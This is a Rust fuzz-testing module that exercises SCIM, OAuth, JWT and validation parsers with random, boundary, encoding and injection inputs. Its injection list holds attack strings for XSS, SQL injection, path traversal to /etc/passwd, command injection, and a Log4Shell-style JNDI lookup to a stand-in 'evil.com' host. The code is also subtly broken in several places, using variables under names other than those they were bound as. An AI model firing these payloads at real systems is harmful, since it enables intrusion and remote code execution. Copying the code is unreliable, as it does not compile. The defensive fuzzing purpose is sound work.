//! Fuzzing module for comprehensive security testing
//!
//! Provides fuzz testing capabilities for all critical parsers and validators

use crate::error_handling::{SecureResult, SecurityError};
use crate::parsers::{JwtParser, OAuthParser, ParserConfig, SafeParser, ScimParser};
use crate::validation::{InputType, SecurityValidator, ValidatorConfig};
use arbitrary::{Arbitrary, Unstructured};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fmt;
use std::time::{Duration, Instant};

/// Fuzz testing configuration
#[derive(Debug, Clone)]
pub struct FuzzConfig {
    /// Maximum test iterations per target
    pub max_iterations: usize,

    /// Maximum input size to generate
    pub max_input_size: usize,

    /// Timeout per fuzz iteration
    pub iteration_timeout: Duration,

    /// Total timeout for fuzz session
    pub total_timeout: Duration,

    /// Whether to enable structured fuzzing
    pub structured_fuzzing: bool,

    /// Whether to collect coverage information
    pub collect_coverage: bool,

    /// Custom mutation strategies
    pub mutation_strategies: Vec<MutationStrategy>,
}

impl Default for FuzzConfig {
    fn default() -> Self {
        Self {
            max_iterations: 10000,
            max_input_size: 64 * 1024,
            iteration_timeout: Duration::from_millis(100),
            total_timeout: Duration::from_secs(300),
            structured_fuzzing: true,
            collect_coverage: false,
            mutation_strategies: vec![
                MutationStrategy::Random,
                MutationStrategy::Injection,
                MutationStrategy::Boundary,
                MutationStrategy::Structure,
            ],
        }
    }
}

/// Mutation strategies for fuzzing
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MutationStrategy {
    /// Pure random input generation
    Random,

    /// Injection attack patterns
    Injection,

    /// Boundary value testing
    Boundary,

    /// Structure-aware mutations
    Structure,

    /// Unicode and encoding attacks
    Encoding,

    /// Size and length attacks
    Size,
}

/// Fuzz test result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FuzzResult {
    /// Target that was fuzzed
    pub target: String,

    /// Total iterations performed
    pub iterations: usize,

    /// Number of crashes/errors found
    pub crashes: usize,

    /// Number of hangs/timeouts
    pub hangs: usize,

    /// Number of security violations detected
    pub security_violations: usize,

    /// Unique error types found
    pub error_types: HashMap<String, usize>,

    /// Test duration
    pub duration: Duration,

    /// Coverage information (if collected)
    pub coverage: Option<CoverageInfo>,

    /// Sample inputs that caused issues
    pub crash_samples: Vec<CrashSample>,
}

/// Coverage information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoverageInfo {
    pub lines_covered: usize,
    pub total_lines: usize,
    pub branches_covered: usize,
    pub total_branches: usize,
    pub functions_covered: usize,
    pub total_functions: usize,
}

/// Sample input that caused a crash or issue
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrashSample {
    /// Input that caused the issue
    pub input: String,

    /// Error type
    pub error_type: String,

    /// Error message (sanitized)
    pub error_message: String,

    /// Mutation strategy used
    pub strategy: String,

    /// Input size
    pub input_size: usize,
}

/// Fuzz target trait
pub trait FuzzTarget {
    /// Name of the fuzz target
    fn name(&self) -> &str;

    /// Execute fuzz test with given input
    fn execute(&self, input: &[u8]) -> FuzzExecutionResult;

    /// Generate structured input for this target
    fn generate_structured_input(
        &self,
        data: &mut Unstructured,
    ) -> Result<Vec<u8>, arbitrary::Error>;

    /// Validate that input is interesting for this target
    fn is_interesting_input(&self, input: &[u8]) -> bool;
}

/// Result of a single fuzz execution
#[derive(Debug, Clone)]
pub enum FuzzExecutionResult {
    /// Normal execution (no crash)
    Normal,

    /// Crash or error occurred
    Crash { error_type: String, error_message: String },

    /// Execution timed out
    Timeout,

    /// Security violation detected
    SecurityViolation { violation_type: String, details: String },
}

/// SCIM filter fuzz target
#[derive(Debug)]
pub struct ScimFilterFuzzTarget {
    parser: ScimParser,
}

impl ScimFilterFuzzTarget {
    pub fn new() -> anyhow::Result<Self> {
        let config = ParserConfig::production();
        let parser = ScimParser::new(config)?;
        Ok(Self { parser })
    }
}

impl FuzzTarget for ScimFilterFuzzTarget {
    fn name(&self) -> &str {
        "scim_filter"
    }

    fn execute(&self, input: &[u8]) -> FuzzExecutionResult {
        if let Ok(input_str) = std::str::from_utf8(input) {
            match self.parser.parse(input_str) {
                Ok(_) => FuzzExecutionResult::Normal,
                Err(error) => {
                    if matches!(error, crate::parsers::ParserError::SecurityViolation(_)) {
                        FuzzExecutionResult::SecurityViolation {
                            violation_type: "parser_security".to_string(),
                            details: error.to_string(),
                        }
                    } else {
                        FuzzExecutionResult::Crash {
                            error_type: format!("{:?}", error),
                            error_message: error.to_string(),
                        }
                    }
                }
            }
        } else {
            FuzzExecutionResult::Crash {
                error_type: "encoding_error".to_string(),
                error_message: "Invalid UTF-8".to_string(),
            }
        }
    }

    fn generate_structured_input(
        &self,
        data: &mut Unstructured,
    ) -> Result<Vec<u8>, arbitrary::Error> {
        let filter = FuzzScimFilter::arbitrary(data)?;
        Ok(filter.to_string().into_bytes())
    }

    fn is_interesting_input(&self, input: &[u8]) -> bool {
        input.len() < 10000 && input.len() > 0
    }
}

/// OAuth parameter fuzz target
#[derive(Debug)]
pub struct OAuthFuzzTarget {
    parser: OAuthParser,
}

impl OAuthFuzzTarget {
    pub fn new() -> anyhow::Result<Self> {
        let config = ParserConfig::production();
        let parser = OAuthParser::new(config)?;
        Ok(Self { parser })
    }
}

impl FuzzTarget for OAuthFuzzTarget {
    fn name(&self) -> &str {
        "oauth_params"
    }

    fn execute(&self, input: &[u8]) -> FuzzExecutionResult {
        if let Ok(input_str) = std::str::from_utf8(input) {
            match self.parser.parse(input_str) {
                Ok(_) => FuzzExecutionResult::Normal,
                Err(error) => {
                    if matches!(error, crate::parsers::ParserError::SecurityViolation(_)) {
                        FuzzExecutionResult::SecurityViolation {
                            violation_type: "oauth_security".to_string(),
                            details: error.to_string(),
                        }
                    } else {
                        FuzzExecutionResult::Crash {
                            error_type: format!("{:?}", error),
                            error_message: error.to_string(),
                        }
                    }
                }
            }
        } else {
            FuzzExecutionResult::Crash {
                error_type: "encoding_error".to_string(),
                error_message: "Invalid UTF-8".to_string(),
            }
        }
    }

    fn generate_structured_input(
        &self,
        data: &mut Unstructured,
    ) -> Result<Vec<u8>, arbitrary::Error> {
        let params = FuzzOAuthParams::arbitrary(data)?;
        Ok(params.to_query_string().into_bytes())
    }

    fn is_interesting_input(&self, input: &[u8]) -> bool {
        input.len() < 10000 && input.contains(&b'=')
    }
}

/// JWT fuzz target
#[derive(Debug)]
pub struct JwtFuzzTarget {
    parser: JwtParser,
}

impl JwtFuzzTarget {
    pub fn new() -> anyhow::Result<Self> {
        let config = ParserConfig::production();
        let parser = JwtParser::new(config)?;
        Ok(Self { parser })
    }
}

impl FuzzTarget for JwtFuzzTarget {
    fn name(&self) -> &str {
        "jwt_tokens"
    }

    fn execute(&self, input: &[u8]) -> FuzzExecutionResult {
        if let Ok(input_str) = std::str::from_utf8(input) {
            match self.parser.parse(input_str) {
                Ok(_) => FuzzExecutionResult::Normal,
                Err(error) => {
                    if matches!(error, crate::parsers::ParserError::SecurityViolation(_)) {
                        FuzzExecutionResult::SecurityViolation {
                            violation_type: "jwt_security".to_string(),
                            details: error.to_string(),
                        }
                    } else {
                        FuzzExecutionResult::Crash {
                            error_type: format!("{:?}", error),
                            error_message: error.to_string(),
                        }
                    }
                }
            }
        } else {
            FuzzExecutionResult::Crash {
                error_type: "encoding_error".to_string(),
                error_message: "Invalid UTF-8".to_string(),
            }
        }
    }

    fn generate_structured_input(
        &self,
        data: &mut Unstructured,
    ) -> Result<Vec<u8>, arbitrary::Error> {
        let jwt = FuzzJwt::arbitrary(data)?;
        Ok(jwt.to_string().into_bytes())
    }

    fn is_interesting_input(&self, input: &[u8]) -> bool {
        input.len() < 10000 && input.iter().filter(|&&b| b == b'.').count() == 2
    }
}

/// Validation fuzz target
#[derive(Debug)]
pub struct ValidationFuzzTarget {
    validator: SecurityValidator,
    input_type: InputType,
}

impl ValidationFuzzTarget {
    pub fn new(input_type: InputType) -> anyhow::Result<Self> {
        let config = ValidatorConfig::production();
        let validator = SecurityValidator::new(config)?;
        Ok(Self { validator, input_type })
    }
}

impl FuzzTarget for ValidationFuzzTarget {
    fn name(&self) -> &str {
        match self.input_type {
            InputType::Email => "email_validation",
            InputType::Url => "url_validation",
            InputType::Phone => "phone_validation",
            InputType::Username => "username_validation",
            _ => "generic_validation",
        }
    }

    fn execute(&self, input: &[u8]) -> FuzzExecutionResult {
        if let Ok(input_str) = std::str::from_utf8(input) {
            let _result = self.validator.validate(input_str, self.input_type);

            if !result.is_valid() {
                // Check if any errors indicate security violations
                for error in &result.errors {
                    if error.code.contains("injection") {
                        return FuzzExecutionResult::SecurityViolation {
                            violation_type: "validation_injection".to_string(),
                            details: error.message.clone(),
                        };
                    }
                }
            }

            FuzzExecutionResult::Normal
        } else {
            FuzzExecutionResult::Crash {
                error_type: "encoding_error".to_string(),
                error_message: "Invalid UTF-8".to_string(),
            }
        }
    }

    fn generate_structured_input(
        &self,
        data: &mut Unstructured,
    ) -> Result<Vec<u8>, arbitrary::Error> {
        match self.input_type {
            InputType::Email => {
                let email = FuzzEmail::arbitrary(data)?;
                Ok(email.to_string().into_bytes())
            }
            InputType::Url => {
                let url = FuzzUrl::arbitrary(data)?;
                Ok(url.to_string().into_bytes())
            }
            InputType::Phone => {
                let phone = FuzzPhone::arbitrary(data)?;
                Ok(phone.to_string().into_bytes())
            }
            _ => {
                let text = FuzzText::arbitrary(data)?;
                Ok(text.0.into_bytes())
            }
        }
    }

    fn is_interesting_input(&self, input: &[u8]) -> bool {
        input.len() < 10000 && input.len() > 0
    }
}

/// Main fuzz test suite
#[derive(Debug)]
pub struct FuzzTestSuite {
    config: FuzzConfig,
    targets: Vec<Box<dyn FuzzTarget>>,
}

impl FuzzTestSuite {
    /// Create new fuzz test suite
    pub fn new(config: FuzzConfig) -> Self {
        Self { config, targets: Vec::new() }
    }

    /// Add fuzz target to the suite
    pub fn add_target<T: FuzzTarget + 'static>(&mut self, target: T) {
        self.targets.push(Box::new(target));
    }

    /// Add all standard targets
    pub fn add_standard_targets(&mut self) -> anyhow::Result<()> {
        self.add_target(ScimFilterFuzzTarget::new()?);
        self.add_target(OAuthFuzzTarget::new()?);
        self.add_target(JwtFuzzTarget::new()?);
        self.add_target(ValidationFuzzTarget::new(InputType::Email)?);
        self.add_target(ValidationFuzzTarget::new(InputType::Url)?);
        self.add_target(ValidationFuzzTarget::new(InputType::Phone)?);
        Ok(())
    }

    /// Run fuzz tests on all targets
    pub fn run_all(&self) -> Vec<FuzzResult> {
        self.targets.iter().map(|target| self.run_target(target.as_ref())).collect()
    }

    /// Run fuzz test on specific target
    pub fn run_target(&self, target: &dyn FuzzTarget) -> FuzzResult {
        let start_time = Instant::now();
        let mut result = FuzzResult {
            target: target.name().to_string(),
            iterations: 0,
            crashes: 0,
            hangs: 0,
            security_violations: 0,
            error_types: HashMap::new(),
            duration: Duration::from_secs(0),
            coverage: None,
            crash_samples: Vec::new(),
        };

        let mut rng = fastrand::Rng::new();

        for i in 0..self.config.max_iterations {
            if start_time.elapsed() > self.config.total_timeout {
                break;
            }

            result.iterations = i + 1;

            // Generate test input
            let input = if self.config.structured_fuzzing && rng.bool() {
                self.generate_structured_input(target)
            } else {
                self.generate_random_input(target)
            };

            // Execute with timeout
            let execution_start = Instant::now();
            let execution_result = target.execute(&input);

            // Check for timeout
            if execution_start.elapsed() > self.config.iteration_timeout {
                result.hangs += 1;
                continue;
            }

            // Process result
            match execution_result {
                FuzzExecutionResult::Normal => {
                    // Normal execution, continue
                }
                FuzzExecutionResult::Crash { error_type, error_message } => {
                    result.crashes += 1;
                    *result.error_types.entry(error_type.clone()).or_insert(0) += 1;

                    if result.crash_samples.len() < 10 {
                        result.crash_samples.push(CrashSample {
                            input: self.sanitize_input_for_display(&input),
                            error_type,
                            error_message: self.sanitize_error_message(&error_message),
                            strategy: format!("random_iteration_{}", i),
                            input_size: input.len(),
                        });
                    }
                }
                FuzzExecutionResult::Timeout => {
                    result.hangs += 1;
                }
                FuzzExecutionResult::SecurityViolation { violation_type, details } => {
                    result.security_violations += 1;
                    *result.error_types.entry(violation_type.clone()).or_insert(0) += 1;

                    if result.crash_samples.len() < 10 {
                        result.crash_samples.push(CrashSample {
                            input: self.sanitize_input_for_display(&input),
                            error_type: violation_type,
                            error_message: self.sanitize_error_message(&details),
                            strategy: "security".to_string(),
                            input_size: input.len(),
                        });
                    }
                }
            }
        }

        result.duration = start_time.elapsed();
        result
    }

    /// Generate structured input for target
    fn generate_structured_input(&self, target: &dyn FuzzTarget) -> Vec<u8> {
        let mut buffer = vec![0u8; 1024];
        fastrand::fill(&mut buffer);

        let mut unstructured = Unstructured::new(&buffer);
        target
            .generate_structured_input(&mut unstructured)
            .unwrap_or_else(|_| self.generate_random_input(target))
    }

    /// Generate random input for target
    fn generate_random_input(&self, target: &dyn FuzzTarget) -> Vec<u8> {
        let _size = fastrand::usize(1..=self.config.max_input_size);
        let mut input = vec![0u8; size];

        // Apply mutation strategies
        for strategy in &self.config.mutation_strategies {
            self.apply_mutation_strategy(&mut input, strategy);
        }

        input
    }

    /// Apply specific mutation strategy
    fn apply_mutation_strategy(&self, input: &mut Vec<u8>, strategy: &MutationStrategy) {
        match strategy {
            MutationStrategy::Random => {
                fastrand::fill(input);
            }
            MutationStrategy::Injection => {
                self.inject_attack_patterns(input);
            }
            MutationStrategy::Boundary => {
                self.inject_boundary_values(input);
            }
            MutationStrategy::Structure => {
                self.inject_structure_attacks(input);
            }
            MutationStrategy::Encoding => {
                self.inject_encoding_attacks(input);
            }
            MutationStrategy::Size => {
                self.inject_size_attacks(input);
            }
        }
    }

    /// Inject common attack patterns
    fn inject_attack_patterns(&self, input: &mut Vec<u8>) {
        let patterns = [
            b"<script>alert('xss')</script>",
            b"'; DROP TABLE users; --",
            b"' OR 1=1 --",
            b"javascript:alert('xss')",
            b"../../../etc/passwd",
            b"${jndi:ldap://evil.com/}",
            b"{{7*7}}",
            b"<%= 7*7 %>",
            b"eval('alert(1)')",
            b"$(touch /tmp/pwned)",
        ];

        if !input.is_empty() {
            let pattern = patterns[fastrand::usize(0..patterns.len())];
            let pos = fastrand::usize(0..input.len());

            // Insert pattern at random position
            input.splice(pos..pos, pattern.iter().copied());
        }
    }

    /// Inject boundary values
    fn inject_boundary_values(&self, input: &mut Vec<u8>) {
        let boundaries = [
            b"",
            b"0",
            b"-1",
            b"2147483647",
            b"-2147483648",
            b"null",
            b"undefined",
            b"NaN",
            b"Infinity",
            &vec![b'A'; 65536],
        ];

        if !input.is_empty() {
            let boundary = boundaries[fastrand::usize(0..boundaries.len())];
            let pos = fastrand::usize(0..input.len());

            input.splice(pos..pos, boundary.iter().copied());
        }
    }

    /// Inject structure-based attacks
    fn inject_structure_attacks(&self, input: &mut Vec<u8>) {
        let attacks = [
            b"(((((((((((((((((((((((((((((((",
            b"))))))))))))))))))))))))))))))))",
            b"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"",
            b"{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{",
            b"}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}",
            b"[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[",
            b"]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]",
        ];

        if !input.is_empty() {
            let attack = attacks[fastrand::usize(0..attacks.len())];
            let pos = fastrand::usize(0..input.len());

            input.splice(pos..pos, attack.iter().copied());
        }
    }

    /// Inject encoding attacks
    fn inject_encoding_attacks(&self, input: &mut Vec<u8>) {
        let encodings = [
            b"%00",
            b"%0a",
            b"%0d",
            b"%20",
            b"%2e%2e%2f",
            b"\\x00",
            b"\\n",
            b"\\r",
            b"\\t",
            b"\xc0\x80", // Overlong UTF-8
        ];

        if !input.is_empty() {
            let encoding = encodings[fastrand::usize(0..encodings.len())];
            let pos = fastrand::usize(0..input.len());

            input.splice(pos..pos, encoding.iter().copied());
        }
    }

    /// Inject size-based attacks
    fn inject_size_attacks(&self, input: &mut Vec<u8>) {
        match fastrand::u32(0..3) {
            0 => {
                // Make very large
                input.resize(self.config.max_input_size, b'A');
            }
            1 => {
                // Make very small
                input.truncate(1);
            }
            2 => {
                // Make empty
                input.clear();
            }
            _ => {}
        }
    }

    /// Sanitize input for safe display
    fn sanitize_input_for_display(&self, input: &[u8]) -> String {
        let max_display_len = 200;
        let truncated =
            if input.len() > max_display_len { &input[..max_display_len] } else { input };

        // Convert to string, replacing invalid UTF-8 with replacement characters
        String::from_utf8_lossy(truncated)
            .replace(['\0', '\x01', '\x02', '\x03', '\x04', '\x05', '\x06', '\x07'], "\\x00")
    }

    /// Sanitize error message for safe display
    fn sanitize_error_message(&self, message: &str) -> String {
        // Remove potentially sensitive information
        message
            .replace("\\", "\\\\")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\0", "\\0")
            .chars()
            .take(500)
            .collect()
    }
}

// Arbitrary implementations for structured fuzzing

#[derive(Debug, Arbitrary)]
struct FuzzScimFilter {
    attribute: FuzzAttribute,
    operator: FuzzOperator,
    value: Option<String>,
}

impl fmt::Display for FuzzScimFilter {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match &self.value {
            Some(value) => write!(f, "{} {} \"{}\"", self.attribute, self.operator, value),
            None => write!(f, "{} {}", self.attribute, self.operator),
        }
    }
}

#[derive(Debug, Arbitrary)]
enum FuzzAttribute {
    UserName,
    Active,
    Email,
    Name,
    Custom(String),
}

impl fmt::Display for FuzzAttribute {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FuzzAttribute::UserName => write!(f, "userName"),
            FuzzAttribute::Active => write!(f, "active"),
            FuzzAttribute::Email => write!(f, "email"),
            FuzzAttribute::Name => write!(f, "name"),
            FuzzAttribute::Custom(name) => write!(f, "{}", name),
        }
    }
}

#[derive(Debug, Arbitrary)]
enum FuzzOperator {
    Eq,
    Ne,
    Co,
    Sw,
    Ew,
    Pr,
}

impl fmt::Display for FuzzOperator {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            FuzzOperator::Eq => write!(f, "eq"),
            FuzzOperator::Ne => write!(f, "ne"),
            FuzzOperator::Co => write!(f, "co"),
            FuzzOperator::Sw => write!(f, "sw"),
            FuzzOperator::Ew => write!(f, "ew"),
            FuzzOperator::Pr => write!(f, "pr"),
        }
    }
}

#[derive(Debug, Arbitrary)]
struct FuzzOAuthParams {
    grant_type: Option<String>,
    client_id: Option<String>,
    redirect_uri: Option<String>,
    scope: Option<String>,
}

impl FuzzOAuthParams {
    fn to_query_string(&self) -> String {
        let mut params = Vec::new();

        if let Some(ref grant_type) = self.grant_type {
            params.push(format!("grant_type={}", urlencoding::encode(grant_type)));
        }
        if let Some(ref client_id) = self.client_id {
            params.push(format!("client_id={}", urlencoding::encode(client_id)));
        }
        if let Some(ref redirect_uri) = self.redirect_uri {
            params.push(format!("redirect_uri={}", urlencoding::encode(redirect_uri)));
        }
        if let Some(ref scope) = self.scope {
            params.push(format!("scope={}", urlencoding::encode(scope)));
        }

        params.join("&")
    }
}

#[derive(Debug, Arbitrary)]
struct FuzzJwt {
    header: FuzzJwtHeader,
    payload: FuzzJwtPayload,
}

impl fmt::Display for FuzzJwt {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let header_json = serde_json::to_string(&self.header).unwrap_or_default();
        let payload_json = serde_json::to_string(&self.payload).unwrap_or_default();

        let header_b64 = base64::encode_config(header_json, base64::URL_SAFE_NO_PAD);
        let payload_b64 = base64::encode_config(payload_json, base64::URL_SAFE_NO_PAD);
        let signature = "fake_signature";

        write!(f, "{}.{}.{}", header_b64, payload_b64, signature)
    }
}

#[derive(Debug, Arbitrary, Serialize)]
struct FuzzJwtHeader {
    alg: String,
    typ: Option<String>,
}

#[derive(Debug, Arbitrary, Serialize)]
struct FuzzJwtPayload {
    sub: Option<String>,
    exp: Option<u64>,
    iat: Option<u64>,
}

#[derive(Debug, Arbitrary)]
struct FuzzEmail(String);

impl fmt::Display for FuzzEmail {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

#[derive(Debug, Arbitrary)]
struct FuzzUrl(String);

impl fmt::Display for FuzzUrl {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

#[derive(Debug, Arbitrary)]
struct FuzzPhone(String);

impl fmt::Display for FuzzPhone {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

#[derive(Debug, Arbitrary)]
struct FuzzText(String);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fuzz_config() {
        let config = FuzzConfig::default();
        assert!(config.max_iterations > 0);
        assert!(config.max_input_size > 0);
    }

    #[test]
    fn test_scim_fuzz_target() {
        let target = ScimFilterFuzzTarget::new().unwrap();
        assert_eq!(target.name(), "scim_filter");

        // Test normal input
        let _result = target.execute(b"userName eq \"test\"");
        matches!(result, FuzzExecutionResult::Normal);

        // Test malicious input
        let _result = target.execute(b"userName eq \"test\"; DROP TABLE users");
        assert!(matches!(result, FuzzExecutionResult::SecurityViolation { .. }));
    }

    #[test]
    fn test_oauth_fuzz_target() {
        let target = OAuthFuzzTarget::new().unwrap();
        assert_eq!(target.name(), "oauth_params");

        let _result = target.execute(b"grant_type=authorization_code&client_id=test");
        matches!(result, FuzzExecutionResult::Normal);
    }

    #[test]
    fn test_jwt_fuzz_target() {
        let target = JwtFuzzTarget::new().unwrap();
        assert_eq!(target.name(), "jwt_tokens");

        // Test invalid JWT
        let _result = target.execute(b"invalid.jwt.token");
        assert!(matches!(result, FuzzExecutionResult::Crash { .. }));
    }

    #[test]
    fn test_fuzz_suite() {
        let config = FuzzConfig {
            max_iterations: 10,
            max_input_size: 100,
            iteration_timeout: Duration::from_millis(10),
            total_timeout: Duration::from_secs(1),
            ..Default::default()
        };

        let mut suite = FuzzTestSuite::new(config);
        suite.add_target(ScimFilterFuzzTarget::new().unwrap());

        let results = suite.run_all();
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].target, "scim_filter");
    }
}
